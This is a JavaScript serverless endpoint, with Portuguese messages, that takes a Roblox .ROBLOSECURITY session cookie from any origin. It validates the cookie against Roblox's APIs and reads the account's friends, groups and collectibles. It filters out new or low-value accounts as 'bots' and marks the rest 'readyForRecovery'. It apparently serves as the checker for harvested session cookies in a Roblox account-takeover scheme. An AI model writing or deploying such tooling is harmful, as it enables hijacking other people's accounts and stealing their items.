// api/validate-account/index.js
export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Método não permitido' });
    }

    const { cookie } = req.body;

    if (!cookie) {
        return res.status(400).json({
            error: true,
            message: '❌ Cookie é obrigatório'
        });
    }

    try {
        // ============================================
        // 1. VALIDAR COOKIE
        // ============================================
        const userResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`
            }
        });

        if (!userResponse.ok) {
            return res.status(401).json({
                error: true,
                message: '❌ Cookie inválido ou expirado',
                invalid: true
            });
        }

        const userData = await userResponse.json();

        // ============================================
        // 2. PEGAR INFORMAÇÕES DA CONTA
        // ============================================
        const [friendsResponse, groupsResponse, inventoryResponse] = await Promise.all([
            fetch(`https://friends.roblox.com/v1/users/${userData.id}/friends/count`),
            fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`),
            fetch(`https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?limit=100`)
        ]);

        const friendsData = await friendsResponse.json();
        const groupsData = await groupsResponse.json();
        const inventoryData = await inventoryResponse.json();

        // ============================================
        // 3. ANALISAR IDADE DA CONTA
        // ============================================
        const createdDate = new Date(userData.created);
        const now = new Date();
        const accountAgeDays = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));

        // ============================================
        // 4. VERIFICAR SE É CONTA BOT
        // ============================================
        let isBot = false;
        let botReasons = [];

        if (accountAgeDays < 60) {
            isBot = true;
            botReasons.push(`📅 Conta criada há apenas ${accountAgeDays} dias (mínimo 60 dias)`);
        }

        const friendsCount = friendsData.count || 0;
        if (friendsCount < 10 && accountAgeDays > 30) {
            isBot = true;
            botReasons.push(`👤 Apenas ${friendsCount} amigos (conta suspeita)`);
        }

        const groupsCount = groupsData.data ? groupsData.data.length : 0;
        if (groupsCount === 0 && accountAgeDays > 30) {
            isBot = true;
            botReasons.push(`🏢 Não participa de nenhum grupo`);
        }

        if (/^[0-9]+$/.test(userData.name)) {
            isBot = true;
            botReasons.push(`🔢 Nome composto apenas por números`);
        }

        const itemsCount = inventoryData.data ? inventoryData.data.length : 0;
        if (itemsCount < 5 && accountAgeDays > 30) {
            isBot = true;
            botReasons.push(`📦 Apenas ${itemsCount} itens no inventário`);
        }

        if (accountAgeDays < 90 && friendsCount < 20) {
            isBot = true;
            botReasons.push(`⚠️ Conta nova com poucos amigos`);
        }

        // ============================================
        // 5. SE FOR BOT - RETORNAR ERRO
        // ============================================
        if (isBot) {
            return res.status(403).json({
                error: true,
                message: '🤖 CONTA BOT DETECTADA',
                reasons: botReasons,
                banned: true
            });
        }

        // ============================================
        // 6. CONTA VÁLIDA - RETORNAR SUCESSO
        // ============================================
        return res.status(200).json({
            success: true,
            message: '✅ Conta validada com sucesso!',
            readyForRecovery: true,
            username: userData.name
        });

    } catch (error) {
        console.error('Erro na validação:', error);
        return res.status(500).json({
            error: true,
            message: '❌ Erro ao validar conta'
        });
    }
}
